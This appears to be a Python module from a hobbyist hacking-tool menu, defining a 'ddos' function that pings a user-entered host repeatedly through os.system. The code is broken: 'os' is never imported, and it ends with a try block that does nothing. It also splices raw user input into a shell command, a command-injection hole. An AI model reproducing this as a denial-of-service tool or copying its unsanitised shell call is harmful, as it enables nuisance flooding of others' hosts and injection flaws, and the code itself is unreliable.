import launcher
from colorama import Fore, Back, Style
#
def ddos():
    while True:
        launcher.later2()
        print("exit enter 99")


        host = input(Style.BRIGHT+Fore.RED+'Enter metod>> '+Fore.RESET)

        if host=="99":
            launcher.later2()
            launcher.launcher()


        counter = 0
        goal = int(input("count>> "))

        while counter <= goal:
            print("---------")
            send_ping = os.system("ping " + host)
            counter += 1
            print(send_ping)
            print(counter)
        for ftid in range(1):
            try:
                pass

            except Exception:
                continue


